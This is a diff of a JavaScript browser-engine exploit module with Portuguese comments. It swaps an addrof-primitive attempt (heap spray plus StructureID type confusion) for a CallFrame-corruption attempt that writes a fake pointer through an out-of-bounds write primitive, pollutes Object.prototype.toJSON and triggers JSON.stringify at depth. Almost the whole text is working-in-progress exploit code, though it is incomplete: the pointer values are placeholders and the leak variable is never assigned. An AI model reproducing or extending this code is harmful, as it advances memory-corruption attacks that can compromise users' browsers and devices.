@@ -1,4 +1,4 @@
-// js/script3/testMemoryLeakViaJsonTC.mjs (ESTRATÉGIA: CONSTRUÇÃO DE ADDROF)
+// js/script3/testMemoryLeakViaJsonTC.mjs (ESTRATÉGIA: CORRUPÇÃO DE CALLFRAME)
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { toHex, AdvancedInt64 } from '../utils.mjs';
 import {
@@ -7,63 +7,68 @@ import {
     clearOOBEnvironment
 } from '../core_exploit.mjs';
 
-// --- Configuração para Primitiva AddrOf ---
-const ADDROF_CONFIG = {
-    SPRAY_COUNT: 500,
-    // NOTA CRÍTICA: O StructureID é um ponteiro que muda a cada execução (devido ao ASLR).
-    // O valor correto precisa ser vazado primeiro. Aqui, usamos um VALOR PLACEHOLDER
-    // que deve ser substituído por um ID real vazado de uma execução anterior ou de um crash.
-    // Este é o ID que diz ao motor "este objeto é um Float64Array".
-    FLOAT64_ARRAY_STRUCTURE_ID: new AdvancedInt64("0x0108230700001234"), // <--- SUBSTITUIR ESTE VALOR
+// --- Configuração para Exploit de Corrupção de CallFrame ---
+const CF_CORRUPT_CONFIG = {
+    // Offset que causou o crash original. Este é o nosso melhor candidato.
+    // Vamos assumir que este é o local de um ponteiro crítico em um CallFrame.
+    CRASH_OFFSET: 0x70,
 
-    // Offset para o campo StructureID dentro do objeto na memória.
-    OFFSET_TO_STRUCTURE_ID: 0, 
+    // Em vez de um valor aleatório, vamos criar um objeto e tentar
+    // sobrescrever o ponteiro do CallFrame com o endereço deste objeto.
+    // Isso requer uma primitiva addrof, que ainda não temos.
+    // Portanto, vamos usar um valor de ponteiro "falso" mas bem formado (tagged pointer).
+    // Este valor simula um ponteiro para um objeto JavaScript.
+    FAKE_POINTER_TO_OBJECT: new AdvancedInt64("0x0108230700001337"), // Placeholder para um ponteiro JS
 };
+// --- Fim dos Parâmetros ---
 
-// --- Funções Auxiliares ---
-// Converte um valor de ponto flutuante (double) para um BigInt de 64 bits.
-function doubleToBigInt(d) {
-    const buffer = new ArrayBuffer(8);
-    const view = new DataView(buffer);
-    view.setFloat64(0, d, true);
-    return view.getBigUint64(0, true);
+// Função que será chamada recursivamente para construir uma pilha de chamadas profundas,
+// tornando mais provável que possamos corromper um CallFrame.
+let leaked_address = null;
+function build_stack_and_trigger(depth, victim_obj) {
+    if (depth <= 0) {
+        // Ponto de gatilho: No fundo da pilha, chamamos JSON.stringify.
+        // Se nossa corrupção OOB foi bem-sucedida, o motor irá usar um CallFrame
+        // corrompido ao processar esta chamada, potencialmente acionando um caminho de código
+        // que vaza informações.
+        try {
+            JSON.stringify(victim_obj);
+        } catch(e) {
+            // Um erro aqui é interessante. Pode ser o resultado da nossa corrupção.
+            logS3(`ERRO DENTRO DA PILHA DE CHAMADAS: ${e.message}`, "warn", "build_stack_and_trigger");
+        }
+        return;
+    }
+    build_stack_and_trigger(depth - 1, victim_obj);
 }
 
-// Converte um BigInt de 64 bits para um valor de ponto flutuante (double).
-function bigIntToDouble(b) {
-    const buffer = new ArrayBuffer(8);
-    const view = new DataView(buffer);
-    view.setBigUint64(0, b, true);
-    return view.getFloat64(0, true);
-}
 
-// --- Função Principal do Exploit ---
-export async function testAddrofPrimitive() {
-    const FNAME = "testAddrofPrimitive";
-    logS3(`--- Iniciando Tentativa de Construção da Primitiva AddrOf ---`, "test", FNAME);
-    logS3(`   Usando StructureID (placeholder) para Float64Array: ${ADDROF_CONFIG.FLOAT64_ARRAY_STRUCTURE_ID.toString()}`, "info", FNAME);
+export async function testArbitraryRead() {
+    const FNAME = "testCallFrameCorruption";
+    logS3(`--- Iniciando Tentativa de Leak via Corrupção de CallFrame ---`, "test", FNAME);
 
     await triggerOOB_primitive();
 
-    // Etapa 1: Pulverizar o heap com uma estrutura controlada.
-    // Cada elemento do array conterá um ArrayBuffer (nosso alvo de corrupção)
-    // e um objeto (que cria um JSScope) cujo endereço queremos vazar.
-    let spray = [];
-    for (let i = 0; i < ADDROF_CONFIG.SPRAY_COUNT; i++) {
-        let arrayBuffer = new ArrayBuffer(128);
-        let victimObject = { target: arrayBuffer }; // Este objeto cria um escopo que podemos ler
-        spray.push(victimObject);
-    }
-    logS3(`${ADDROF_CONFIG.SPRAY_COUNT} pares de (objeto, ArrayBuffer) pulverizados.`, "info", FNAME);
+    // Objeto que passaremos para JSON.stringify.
+    const victim = {};
+    const ppKey = 'toJSON';
 
-    // Etapa 2: Corromper um dos ArrayBuffers pulverizados.
-    // Como não sabemos o endereço exato, tentamos um offset comum.
-    // Em um exploit real, esta parte seria mais sofisticada.
-    const corruption_base_offset = 0x4000;
-    logS3(`Tentando corromper StructureID no offset relativo ${toHex(corruption_base_offset)}`, "warn", FNAME);
+    // Etapa 1: Poluir Object.prototype.toJSON para que possamos observar o comportamento.
+    // Se a corrupção funcionar, 'this' pode não ser o que esperamos.
+    Object.defineProperty(Object.prototype, ppKey, {
+        value: function() {
+            logS3(`[${ppKey} Poluído] Chamado! 'this' é do tipo: ${Object.prototype.toString.call(this)}`, "info", FNAME);
+            // Se conseguirmos vazar um endereço aqui, seria uma grande vitória.
+            // Por enquanto, apenas registramos a chamada.
+            return { executed: true };
+        },
+        writable: true, configurable: true, enumerable: false
+    });
 
+    // Etapa 2: Escrever nosso ponteiro falso no offset que acreditamos ser parte de um CallFrame.
+    logS3(`Corrompendo offset ${toHex(CF_CORRUPT_CONFIG.CRASH_OFFSET)} com ponteiro falso ${CF_CORRUPT_CONFIG.FAKE_POINTER_TO_OBJECT.toString()}`, "warn", FNAME);
     try {
-        oob_write_absolute(corruption_base_offset + ADDROF_CONFIG.OFFSET_TO_STRUCTURE_ID, ADDROF_CONFIG.FLOAT64_ARRAY_STRUCTURE_ID, 8);
+        oob_write_absolute(CF_CORRUPT_CONFIG.CRASH_OFFSET, CF_CORRUPT_CONFIG.FAKE_POINTER_TO_OBJECT, 8);
     } catch (e) {
         logS3(`Falha ao escrever OOB: ${e.message}`, "error", FNAME);
         clearOOBEnvironment();
@@ -72,38 +77,17 @@ export async function testAddrofPrimitive() {
     
     await PAUSE_S3(100);
 
-    // Etapa 3: Encontrar o objeto corrompido e usar a confusão de tipos.
-    let addrof_leaked_addr = null;
-    for (let i = 0; i < spray.length; i++) {
-        let ab = spray[i].target;
-        // Se a corrupção funcionou, o objeto 'ab' agora é um Float64Array para o motor.
-        // O `instanceof` ainda pode considerá-lo um ArrayBuffer, mas o acesso aos
-        // elementos será tratado como um Float64Array.
-        if (ab.length > 0) { // Um ArrayBuffer normal não tem a propriedade 'length'.
-            logS3(`--- SUCESSO: Objeto [${i}] foi confundido com um Float64Array! ---`, "vuln", FNAME);
-            
-            // Agora 'ab' nos dá uma visão de leitura/escrita da memória adjacente.
-            // O objeto adjacente deve ser o próximo na memória, que é spray[i+1].
-            // Vamos tentar ler o endereço de spray[i+1].target (um ArrayBuffer).
-            if (i + 1 < spray.length) {
-                const confused_view = ab; // Agora tratado como um array de floats
-                
-                // Os ponteiros dentro do JSScope adjacente agora podem ser lidos como doubles.
-                const pointerAsDouble = confused_view[4]; // Este índice é uma suposição e precisa de ajuste
-                
-                if (pointerAsDouble) {
-                    addrof_leaked_addr = doubleToBigInt(pointerAsDouble);
-                    logS3(`   >> ENDEREÇO VAZADO (de spray[${i+1}].target): ${toHex(addrof_leaked_addr)}`, "leak", FNAME);
-                    break;
-                }
-            }
-        }
-    }
+    // Etapa 3: Construir uma pilha de chamadas profundas e acionar o gatilho.
+    logS3("Construindo pilha de chamadas para posicionar CallFrames na memória e acionando JSON.stringify...", "info", FNAME);
+    build_stack_and_trigger(20, victim);
 
+    // Limpeza
+    delete Object.prototype[ppKey];
     clearOOBEnvironment();
-    if (addrof_leaked_addr) {
-        logS3(`--- Primitiva ADDROF construída com sucesso! ---`, "vuln", FNAME);
+    
+    if (leaked_address) {
+         logS3(`--- SUCESSO! Endereço vazado: ${toHex(leaked_address)} ---`, "vuln", FNAME);
     } else {
-        logS3(`--- Teste concluído. A corrupção pode não ter atingido o alvo correto. ---`, "warn", FNAME);
+         logS3("--- Teste concluído. Nenhum vazamento óbvio, mas verifique o console por erros ou comportamento inesperado. ---", "warn", FNAME);
     }
 }
